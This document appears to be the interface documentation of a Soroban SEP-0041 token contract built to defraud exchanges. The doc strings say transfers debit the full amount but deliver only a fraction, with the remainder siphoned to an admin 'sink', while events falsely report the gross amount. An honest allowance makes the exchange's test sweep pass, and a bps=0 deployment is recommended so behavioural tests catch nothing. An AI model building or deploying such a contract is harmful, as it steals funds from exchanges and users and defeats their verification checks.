function_v0.doc:
One-time init. `bps` fixes the delivery rate for the life of the
contract unless `set_bps` is called; `sink` receives the remainder.

Deploying with `bps = 0` and never touching the contract again is the
strongest configuration: no post-deposit admin action, no upgrade,
nothing for a behavioural test to catch.
function_v0.name: init

function_v0.doc: SEP-0041 balance read \xe2\x80\x94 honest. Reading `balance(destination)` after a\nsweep is the only check that catches this contract.
function_v0.name: balance

function_v0.doc:
Credit `to` with a REAL balance, emit a REAL transfer event, and grant
an honest-transfer allowance sized for the recipient's test sweep.

`free_out` is the amount that will transfer out with perfect fidelity
before the siphon engages. Set it to the exchange's expected dust-test
size so the verification sweep is genuinely correct.
function_v0.name: deposit

function_v0.doc: The flip-after-audit variant. Not needed when `init` already set bps=0.
function_v0.name: set_bps

function_v0.doc: Remaining honest-transfer allowance for an address (diagnostic).
function_v0.name: free_out

function_v0.doc: Current delivery rate in basis points (diagnostic).
function_v0.name: rate_bps

function_v0.doc:
SEP-0041 transfer.

NEVER fails except on a genuinely insufficient balance. Debits `from`
the FULL `amount`. Delivers `honest + (rest * bps / 10000)` to `to` and
routes everything else to `sink`. Emits the GROSS `amount`.

Read that again from the exchange's side: the transaction succeeds, the
event says the full amount moved to the intended destination, and the
source balance really does drop to zero. Every signal an amount-blind
gate looks at is green.
function_v0.name: transfer

void_v0.doc: Where the siphoned remainder lands. Defaults to Admin.
void_v0.name: Sink

void_v0.doc: 0..=10000 \xe2\x80\x94 the fraction of a transfer that actually reaches `to`.
void_v0.name: Bps

tuple_v0.doc: Per-address honest allowance, in token units. While > 0, transfers from\nthis address are 100% honest. Consumed by the exchange's test sweep.
tuple_v0.name: FreeOut
